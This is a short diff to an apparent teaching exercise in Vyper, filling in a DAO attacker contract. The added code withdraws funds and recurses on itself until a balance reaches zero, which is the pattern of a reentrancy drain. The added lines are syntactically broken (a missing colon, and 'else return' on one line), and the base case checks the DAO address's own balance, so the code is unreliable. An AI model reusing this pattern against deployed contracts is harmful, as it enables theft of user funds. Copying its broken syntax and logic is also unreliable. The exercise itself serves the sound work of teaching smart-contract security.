@@ -18,9 +18,13 @@ def _attack() -> bool:
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
 
-    if DAO(self.dao_address).withdraw():
+    DAO(self.dao_address).withdraw()
+
+    if DAO(self.dao_address).userBalance(self.dao_address) == 0
         return True
-    
+
+    else return _attack()
+
 
 @external
 @payable
